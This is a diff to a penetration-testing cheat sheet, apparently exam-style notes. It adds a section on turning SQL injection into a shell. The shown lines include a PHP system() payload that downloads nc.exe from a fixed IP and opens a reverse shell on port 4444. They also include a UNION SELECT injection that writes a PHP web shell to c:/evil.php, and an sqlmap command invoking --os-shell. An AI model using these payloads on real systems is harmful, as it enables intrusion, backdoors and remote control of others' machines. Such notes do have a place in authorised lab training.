@@ -168,6 +168,16 @@ powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$
 <?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>
 ```
 
+#### SQL Injection to Shell or Backdoor
+```bash
+# Assumed 3 columns
+http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"<?php system($_REQUEST['cmd']);?>",2,3 INTO OUTFILE "c:/evil.php"-- uMj
+```
+```bash
+# sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
+sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10
+```
+
 ## Local Enumeration & Privilege Escalation
 
 #### Binary Exploitation with ImmunityDebugger
